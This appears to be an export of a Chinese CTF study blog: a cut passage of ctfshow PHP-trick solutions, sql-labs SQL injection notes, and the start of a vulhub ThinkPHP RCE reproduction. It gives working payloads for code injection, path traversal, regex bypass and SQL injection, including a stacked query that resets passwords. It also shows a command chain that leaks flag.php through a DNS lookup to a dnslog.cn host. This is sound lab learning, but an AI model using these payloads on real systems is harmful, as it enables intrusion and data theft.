0x0B，一个垂直制表符。\n\n这里需要注意一下，换页符也是一个空白字符，但没有过滤掉\n还提一下，url编码是基于%加字符ascii码值进行编码，以前竟然不知道\n2.!&#x3D;&#x3D;与=&#x3D;解释之前一直都不是特别清楚php中松散比较和严格比较，这一题不得不去搞明白了，我们上PHP手册\n\n\n\n例子\n名称\n结果\n\n\n\n$a &#x3D;&#x3D; $b\n等于\n**true**，如果类型转换后 $a 等于 $b。\n\n\n$a &#x3D;&#x3D;&#x3D; $b\n全等\n**true**，如果 $a 等于 $b，并且它们的类型也相同。\n\n\n$a !&#x3D; $b\n不等\n**true**，如果类型转换后 $a 不等于 $b。\n\n\n$a &lt;&gt; $b\n不等\n**true**，如果类型转换后 $a 不等于 $b。\n\n\n$a !&#x3D;&#x3D; $b\n不全等\n**true**，如果 $a 不等于 $b，或者它们的类型不同。\n\n\n$a &lt; $b\n小于\n**true**，如果 $a 严格小于 $b。\n\n\n$a &gt; $b\n大于\n**true**，如果 $a 严格大于 $b。\n\n\n$a &lt;&#x3D; $b\n小于等于\n**true**，如果 $a 小于或者等于 $b。\n\n\n$a &gt;&#x3D; $b\n大于等于\n**true**，如果 $a 大于或者等于 $b。\n\n\n$a &lt;&#x3D;&gt; $b\n太空船运算符（组合比较符）\n当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。\n\n\n当两个操作对象都是数字字符串， 或一个是数字另一个是 数字字符串， 就会自动按照数值进行比较。 此规则也适用于switch语句。 当比较时用的是 === 或 !==， 则不会进行类型转换——因为不仅要对比数值，还要对比类型。\n关键在于两个操作对象都是数字字符串， 或一个是数字另一个是 数字字符串， 就会自动按照数值进行比较，也就是说会自动进行类型转化，然后进行比较\n于是这题我们利用PHP认定**%0c36**为数字字符串进行转化结果为数字36这个特性\n?num=%0c36\n\n123关error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125; \n\n这里只有两个比较特使的地方，就是传了好几个参数，以及和18进行弱类型比较\n1.POST传参变量特殊字符转换在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM\n也就是说，字符转化只会进行一次，我们想要.保留下来，只需要在前面进行一次转化即可\n2.弱类型比较当字符串和数字进行比较时，会将字符串转化为数字。\n&#x27;a&#x27;//由于没有数字，转化结果为0&#x27;1a&#x27;//转化结果为1//也就是说php类型转化只识别字符串中数字\n\n也就是说，我们字符串中只要不出现大于18的数字就可以绕过\nPOST:CTF_SHOW=1&amp;CTF[show.com=2&amp;fun=echo $flag\n\n125关error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;\n\n这一关题目和上一关差不多，但多过滤了一些打印函数，这题也有很多解法，主要是通过试用未过滤的打印函数，但那样就太寻常了，我们来试下变量覆盖\n1.extract()变量覆盖extract()函数是PHP中一个非常实用的功能，主要用于将数组中的键值对导入到当前的符号表中。这样，数组的键名就成为了变量的名称，其对应的值则成为变量的值。这一过程极大地简化了从数组中提取和使用数据的操作\nextract(array $var_array [, int $extract_type [, string $prefix]]); //我只需要记住第一个数组参数是需要提取数据的数组\n\n也就是说，这个函数可以把数组中键值对的形式提取出来，转化为变量和值的形式，这也就是为上么可以进行变量覆盖\npayload\nCTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me\n\n竟然可以这样提出POST请求中变量，以前一个一个写还是太麻烦了\n126关error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;\n\n服了，越来越难，每题payload都不同，搞得一点想法都没有了\n1.$SERVER[‘argv’] 参数数组当你在命令行中运行PHP脚本时，可以在脚本名称后面添加参数，这些参数会被存储在 $_SERVER[&#39;argv&#39;] 数组中。$_SERVER[&#39;argv&#39;] 数组的第一个元素（索引为 0）是被执行的PHP脚本的文件名，后续元素则是按顺序传递的命令行参数。\n$_SERVER[&#x27;argv&#x27;]：1、cli模式（命令行）下\t第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下\t在web页模式下必须在php.ini开启register_argc_argv配置项\t    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]    $argv,$argc在web模式下不适用\n\n也就是说\n?$fl0g=flag_give_me$a[0]=$_SERVER[&#x27;argv&#x27;][0]=$_SERVER[‘QUERY_STRING’]=&gt;$fl0g=flag_give_me\n\n所以我们写这个题目和数组原来的用法好像没有关系，而是利用了在web页面下的特性\n2.assert()在PHP中，assert() 是一个用于调试和测试的内置函数，它允许你在代码中设置断言。断言是一种在代码中插入的检查，用于验证某个条件是否为真。如果断言的条件为假，程序会抛出一个错误或异常，这有助于在开发和调试阶段快速发现问题。\nassert ( mixed $assertion [, Throwable $exception ] ) : bool $assertion：要检查的条件。它可以是一个布尔表达式，也可以是一个字符串，在这种情况下，字符串会被当作PHP代码来执行，其结果会被当作断言的条件。$exception（可选）：当断言失败时要抛出的异常对象。如果提供了这个参数，断言失败时会抛出这个异常，而不是默认的行为。\n\n如果断言的条件为真，assert() 返回 true；如果条件为假，assert() 根据不同的配置会有不同的行为，默认情况下会触发一个 AssertionError 异常。\n也就是，我们可以利用字符串会被执行然后得到结果作为判断条件的特性，我们可以执行代码\n?$fl0g=flag_give_me//由于加了个$就绕过了CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=assert($a[0])\n\n129关error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123;    $f = $_GET[&#x27;f&#x27;];    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;        echo readfile($f);    &#125;&#125;\n\n这个题目的函数没有什么特殊的，也没有什么绕过，主要是关于文件路径的一些\n//题目需要在那匹配到ctfshow，又需要访问到当前目录下下的flag.php文件，如果是正常文件路径肯定不行，php特性找的就是空子?f=/ctfshow/../var/www/html/flag.php//这个我对其的猜测在文件系统中，.. 代表上级目录。当路径中出现 目录名/.. 时，系统会尝试进入指定的目录，然后再返回上级目录，这在逻辑上就相当于忽略了这个目录。\n\n131关error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = (String)$_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125; \n\n1.正则匹配栈溢出以前竟然不知道正则匹配有长度限制，多出去的就不匹配了，于是我们以前的题目都可以使用这个方法绕过正则匹配\n&lt;?php$a=str_repeat(&#x27;flag&#x27;,250000);$b=$a.&#x27;36Dctfshow&#x27;;echo $b;//网上也没看到限制长度到底是多少，随便来个100万个字符差不多了\n\nf=.....36Dctfshow\n\n\n\n133关现在看不懂，等时机成熟，很好过了20分钟，时机果然到了\nerror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;\n\n?F=`$F` ;//一开始不知道这是干什么，后面稍微明白了，我们写入后就成了$F=`$F` ;.....//在执行完substr()函数后eval(`$F` ;)//就成了将$F作为系统命令执行，我们在后面就可以RCE了(``相当于shell_exec)//但是还是需要绕过过滤?F=`$F` ;ls;eval(``$F` ;ls;` ;)//看似已经结束了，但这个题目是没有回显的，我们看不到执行结果\n\n我们已经知道怎么去搞这个特殊的套娃，剩下的就是去\neval(``$F`; ping `cat flag.php | grep ctfshow`.wutsuc.dnslog.cn -c 1` ;)//我们这样的话就可以将cat flag.php的内容作为 grep ctfshow 的输入从输入内容中筛选包含 ctfshow 字符串的行将文件内容作为子域名，生成形如 flag&#123;abc123&#125;.wutsuc.dnslog.cn 的域名。尝试解析该域名时，DNS查询会发送到攻击者控制的 dnslog.cn 平台，攻击者可通过日志获取文件内容\n\n\n\n134关现在已经释怀了，加油抄wp\nhighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;    die(file_get_contents(&#x27;flag.php&#x27;));&#125;\n\n看到extract()就知道用变量覆盖\nparse_str()会把字符串转化为变量\n?_POST[key1]=36d&amp;_POST[key2]=36d//转化结果为$_POST[key1]=36d $_POST[key2]=36d//就这么成了$_POST数组的值了\n\n","tags":["PHP特性"]},{"title":"sql注入","url":"/2025/01/12/sql%E6%B3%A8%E5%85%A5/","content":"sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。\n1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。\n参数类型分类\n\n数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。\n\n如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 select * from table where id&#x3D;3\n\n字符型：字符型注入正好相反\n\n当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹\n例如数字型语句：select * from table where id &#x3D;3\n则字符型如下：select * from table where name&#x3D;’admin’\n可以通过以下方法判断注入类型\nid&#x3D;1 and 2&#x3D;1 –+;数字型id&#x3D;1 ‘ and 2&#x3D;1–+;字符型主要通过是否需要形成闭环判断，数字型不需形成闭环；\n闭环类型则需要不断尝试才可以判断出\n2.数据表字段数判断使用order by n 来判断当前表中存在的字段个数，当n大于当前表中实际的字段个数时会引发报错。\n?id=1&#x27; order by 4 --+ \n\n效果如下：\n\n\n3.注入手法注入手法分类\n1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错注入）3.Boolean-based blind SQL injection（基于布尔的盲注）4.Time-based blind SQL injection（基于时间的盲注）5.Stacked queries SQL injection（堆叠查询SQL注入）\n字符串连接函数介绍\n\nconcat(str1,str2,…)——没有分隔符地连接字符串\n\nconcat_ws(separator,str1,str2,…)——含有分隔符地连接字符串\n\ngroup_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据\n\n\n说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。\n1.联合注入(union注入)在网页存在回显时优先使用union注入\n在成功判断注入类型与字段数后即可通过union注入爆数据\nunion演示：\n\n\n我们在限定只能显示一行语句的情况下，通过指定一个无法查询到的数据(如id&#x3D;0)导致无法显示，只能显示union 查询内容\n以下为union注入中较为常用的一些函数和环境变量\n\n\n\n名称\n功能\n\n\n\nversion()\nMySQL 版本\n\n\nuser()\n当前数据库用户名\n\n\ndatabase()\n当前数据库名\n\n\n@@version_compile_os\n操作系统版本\n\n\n@@datadir\n数据库路径\n\n\n爆数据库名\n?id=-1&#x27; union select 1,2,database() --+\n\n\n\n爆数据库表\n#直接套用语句?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\n\n\n爆数据库字段\n#只需指定表名即可?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+#或者指定当前数据库名?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+\n\n\n\n爆数据\n#只需指定表名和字段名?id=-1&#x27; union select 1,2,group_concat(`id`,&#x27;:&#x27;,`username`,&#x27;:&#x27;,`password`) from users --+#字段值不加反引号也可以?id=-1&#x27; union select 1,2,group_concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from users --+\n\n\n\n2.报错注入在联合查询无法使用的情况下，并且存在报错回显的时候优先使用报错注入\n报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。\n1.extractvalue()函数\n?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+不需要了解函数具体作用，只需更改第二个参数即可\n\n通过非法字符与查询内容使用concat()连接，导致报错。concat()中查询方式和union注入一样，但通过报错回显内容字节数有限，可以通过**substr()函数或limit()**函数控制报错回显内容\n2.updatexml()\nand updatexml(1,concat(&#x27;^&#x27;,(需要查询的内容),&#x27;^&#x27;),1)\n\n也是通过非法字符连接进行报错，感觉和extractvalue()差不多\n3.floor()\n通过floor()函数进行报错有点难，所以使用的优先级最小\nand (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+通过count(*)在统计rand()提供的随机数的数量时发生报错\n\n3.盲注1.布尔盲注布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。\n\n\n\n判断数据库类型\n\n\nMySQL数据库表   information_schema.tables\naccess           msysobjects \nSQLServer        sysobjects\n\n一般应该都是MySQL数据库吧\n用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库\n//判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+//判断是否是 access数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+//判断是否是 Sqlserver数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+\n\n正常显示：\n\n\n报错界面：\n\n\n2.判断数据库名\n判断数据库名长度\n通过**length()**函数返回库名长度，与自己提供的数据进行比大小通过是否报错进一步推断出长度\nhttp://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+\n\n判断库名\n通过**ascii()函数返回字符的ascii码值，与提供数字进行比较。和substr()**函数控制字符进行判断。\nhttp://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ \n\n然后依次判断表名，列名，数据即可。\n3.时间盲注在没有回显信息与报错信息也没有布尔类型状态时，我们可以通过时间盲注，推断出数据库的信息。\n时间盲注即和布尔盲注一样通过判断字符推断，只不过将布尔判断改为使用**sleep()函数，通过加载时间判断语句是否被执行来推断，一般还需结合if()**函数\n**if()**函数if(1,2,3)函数与PHP中三元运算符类似，当1中语句为真时执行2中语句，否则执行3中语句。\n**sleep()**函数sleep(3)即休息3秒，所以当语句被执行时加载时间会多三秒\n实例：\n?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;110,sleep(5),0) --+\n\n通过if()与sleep()结合判断出具体名字\n其他的以后看见再补充吧\n4.HTTP头注入常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方\n\n\n产生注入的条件：\n- 能够对请求头消息进行修改\n- 修改的请求头信息能够带入数据库进行查询\n- 数据库没有对输入的请求信息做过滤\nHTTP头注入需要抓包，我使用的抓包软件为burp suite很好用，就是有点难装和配置。\n1.User-Agent注入 User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。\n这里开始有难度了，于是引入实例：sqli-labs less-18 \n注入点判断\n我们在尝试完其他方法后，基本可以确定使用HTTP头注入，我们可以在user-agent值后面加上’，引发报错，确定存在sql注入\n我们可以根据报错内容完成闭环，然后再使用其他注入手法\n注意事项\nsqli-labs less-18 的PHP源代码中先核实了账号与密码再进行 user-agent 的注入，所以必须先输对账号和密码才可以进行注入\n本关无法在表单提交中注入是因为对输入内容进行了转义处理即：\n$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;\n\n实例界面：\n\n\n2.referer注入Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。\n除了注入点的改变，其他和user-agent注入一样。\n3.cookie注入 cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。\n也是除了注入点其他都一样\n5.二阶注入二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。\n1.黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。\n2.服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。\n3.黑客向服务端发送第二个与第一次不相同的请求数据信息。\n4.服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。\n5.服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功\n总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。\n即在第一次以数据储存的形式将特殊语句储存，再在第二次请求时与第一次储存的语句发生作用，形成注入。\nsqli-labs less-24\n\n如下点击注册用户\n\n\n\n这里注册用户名为 admin’#\n\n\n$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;//因为我们的username为admin&#x27;#$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;//导致用户名识别为admin,我们也就可以更改admin的密码\n\n6.宽字节注入宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。在之前的注入过程中我们会遇到下面语句：\n$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;//之前我们遇到默认不可注入\n\n这条语句将经过我们注入的语句使用函数进行转义\nmysql_real_escape_string()\nmysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n下列字符受影响：\n\n\\x00\n\\n\n\\r\n\\\n‘\n“\n\\x1a\n\n如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。\n也就是说，我们用来形成闭合的’，”会被转义(即在前面添加\\ ，导致只作为字符出现，不行使语法作用)，这么一来，我们之前的所有注入方法似乎都不可行了，于是便要使用宽字节注入\n我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：\n\n让斜杠（\\）失去作用\n让斜杠（\\）消失\n\n第一个思路就是借鉴程序员的防范思路，对斜杠（\\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。\n关于编码\n在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码。\n\n某字符的大小为一个字节时，称其字符为窄字节.\n\n当某字符的大小为两个字节时，称其字符为宽字节.\n\n所有英文默认占一个字节，汉字占两个字节\n\n常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等\n\n\n宽字节注入       \n宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。\n  由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的\n   我们在前面加上 %df’  ,转义函数会将%df’改成%df\\’ , 而\\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \\ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。\n\n‘           %27\n\\           %5c\n%df&#39;    %df%5c’ -&gt;  運’\n\n也就是说在’前面添加%df，可以和\\合并组成汉字从而让\\消失\n我们通过宽字符让单个符号恢复后，还不能解决所有问题，比如\ntable_name=&#x27;users&#x27;#我们使用宽字符注入的结果为table_name=運&#x27;users運&#x27;#这会导致表名变得无法查询\n\n面对上述情况我们可以依靠sql语句识别16进制的特性，将字符串转为16进制，不需要引号包裹，可以绕过PHP代码中的转义，但需要在16进制编码前面添加0x象征16进制\n比如：\ntalbe_name=&#x27;users&#x27;table_name=0x656d61696c73\n\nPOST宽字节注入\n我以为已经结束了，没想到上面的全是关于GET请求的方法，于是POST它来了\n因为post 请求不经过URL编码，所以我们无法通过识别%df&#x2F;为汉字，但是也有解决办法，即通过有些汉字为三字节，我们可以在前面添加’汉’等二字节字符来和&#x2F;组成三字节汉字来绕过转义\n7.堆叠查询堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。\n也就是说，这是一个大漏洞了，只要完成闭合在添加一个分号，我们就可以自己写执行的sql语句了。\n这一切都来自此函数：\nmysqli_multi_query($con1, $sql)//可以在$sql中写多条sql语句用分号隔开即可\n\nid=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ \n\n意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句\n\n\n\n\n4.过滤绕过即在注入语句时，有些会将我注入语句中 ：and ,or ,#,–,空格…等符号进行替换为空\n当单词被过滤时\n$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);\t//通过正则表达式找出$id中的&#x27;or&#x27; 然后通过preg_replace()函数将其替换为空//正则表达式中&#x27;i&#x27;指的是不区分大小写，如果没有i就可以使用大小写绕过//我可以通过&#x27;oorr&#x27;和&#x27;anandd&#x27;这种形式，让内部的or和and被替换然后剩余部分继续拼接成or与and//单词中的也需要注意，如information应写成infoorrmation\n\n?id=-2&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;--+\n\n不得不说，为什么less-25中’#’,’–qwq’不可以用，但’–+’可以用\n当空格被过滤时\n第二十六关将逻辑运算符，注释符以及空格给过滤了，我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用&amp;&amp;和||替换。空格绕过网上找了些资料，对于绕过空格限制有大把的方式对于空格，有较多的方法：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格，我在windows和kali里面都用不了，可能是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入。\n过滤代码：\n$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);\t\t\t//strip out OR (non case sensitive)\t$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);\t\t//Strip out AND (non case sensitive)\t$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id);\t\t//strip out /*\t$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);\t\t//Strip out --\t$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);\t\t\t//Strip out #\t$id= preg_replace(&#x27;/[\\s]/&#x27;,&quot;&quot;, $id);\t\t//Strip out spaces\t$id= preg_replace(&#x27;/[\\/\\\\\\\\]/&#x27;,&quot;&quot;, $id);\t\t//Strip out slashes\n\n没空格的报错注入：\n?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database))),1))||&#x27;0   爆表   ?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;aandnd(table_name=&#x27;users&#x27;)))),1))||&#x27;0     爆字段   ?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#x27;0   爆密码账户//这里只能用||,我个人认为当使用&amp;&amp;时会导致id=0(即后面条件为假，返回0)导致报错\n\n当注释符被过滤时\n即我们无法直接通过注释符注释掉形成闭环后多出来的闭合符，于是我们可以通过输入\nand &#x27;1&#x27;=&#x27;1//这样就可以在不影响前面条件对错的情况下将多余的&#x27;变得不多于//相应的,其他闭合符就全部进行替换即可\n\n当逗号被过滤时\n在此之前我们需要学习MySQL语句中join的用法\njoin的用法\nSQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。\n最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。\n语法：\nSELECT column1, column2, ...FROM table1JOIN table2 ON condition;#condition 即代表两个表的拼接方式\n\n参数说明：\n\n**column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。\ntable1：要连接的第一个表。\ntable2：要连接的第二个表。\ncondition：连接条件，用于指定连接方式\n\njoin有很多种用法，我们只需用到常用的一种即可\n实例：\nselect * from users join emails on users.id=emails.id;\n\n\n\n显而易见，这条sql语句根本没有使用’,’也达到了将两张表拼接起来的效果，相应的使用join可以省掉select 1,2,3的逗号\n我们可以输入一下语句：\nselect *from users where id=1 union select * from (select 1)c join(select 2)a join(select 3)b;#语句未使用逗号，和普通联合查询一样，只需要更改1,2,3对应内容即可#还有a,b,c是别称，是必须的\n\n额，不知道为什么，我的靶场好像和别人的不一样，别人都less-25a是会吞掉输入的逗号的，但我的只吞and和or看来只能用数据库做演示了\n上面代码执行的的效果图：\n\n\n\n\nand和or被过滤时\n"},{"title":"vulhub_ThinkPHP漏洞复现","url":"/2025/08/18/vulhub-ThinkPHP-2-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"vulhub_ThinkPHP 2-rce漏洞复现暑假要结束了，结果漏洞都还没开始复现，这个暑假基本上都在写java，不仅题目没怎么写java也没怎么学，CTF之路异常坎坷啊\n想要使用vulhub复现漏洞当然使用docker，花了好多时间终于把docker和vulhub给装上了\n安装好了就直接进入vulhub对应的目录拉取镜像即可\ndocker images #可以查看我们已经拉取的镜像docker compose up -d #进入到对应漏洞后拉取镜像docker ps #查看当前已经开启的环境ip a #查看虚拟机ip\n\n我们通过虚拟机ip即可访问靶场，然后就是获取源代码\ndocker cp &lt;容器ID或名称&gt;:&lt;容器内路径&gt; &lt;宿主机路径&gt;docker cp 2-rce-web-1:/var/www/html ~/thinkphp_srcdocker cp 5023-rce-web-1:/var/www/html 